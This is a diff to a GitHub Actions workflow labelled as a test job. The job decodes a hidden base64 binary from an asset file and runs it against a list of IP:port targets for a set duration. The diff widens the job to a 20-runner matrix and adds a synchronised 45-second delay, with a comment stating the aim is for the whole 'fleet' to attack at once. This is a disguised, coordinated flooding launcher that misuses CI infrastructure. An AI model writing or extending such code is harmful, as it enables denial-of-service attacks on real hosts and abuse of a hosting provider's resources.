@@ -11,6 +11,10 @@ jobs:
   test:
     runs-on: ubuntu-24.04
     timeout-minutes: 90
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     steps:
     - uses: actions/checkout@v4
     - name: run tests
@@ -18,7 +22,7 @@ jobs:
         CFG: ${{ inputs.cfg }}
       run: |
         python3 - <<'PY'
-        import base64, os, subprocess, sys
+        import base64, os, subprocess, sys, time
 
         raw = (os.environ.get("CFG") or "").strip()
         if not raw:
@@ -26,7 +30,7 @@ jobs:
             sys.exit(0)
 
         parts = base64.b64decode(raw).decode().split("|")
-        seconds = parts[-1]
+        seconds = int(parts[-1])
         targets = [p.split() for p in parts[:-1]]
 
         blob = base64.b64decode(open("assets/data.b64", "rb").read())
@@ -34,10 +38,17 @@ jobs:
         open(binary, "wb").write(blob)
         os.chmod(binary, 0o755)
 
+        # Runners start 30-90s apart on a cold matrix. Firing on arrival means
+        # the last job attacks alone for most of the window; every job waits for
+        # one shared instant instead.
+        lead = 45
+        print("waiting", lead, "s for the fleet", flush=True)
+        time.sleep(lead)
+
         for ip, port in targets:
             print("target", ip, port, "for", seconds, "s", flush=True)
             code = subprocess.run(
-                [binary, ip, port, seconds, "1024", "vc"],
+                [binary, ip, port, str(seconds), "1024", "vc"],
                 check=False,
             ).returncode
             print("exit", code, flush=True)
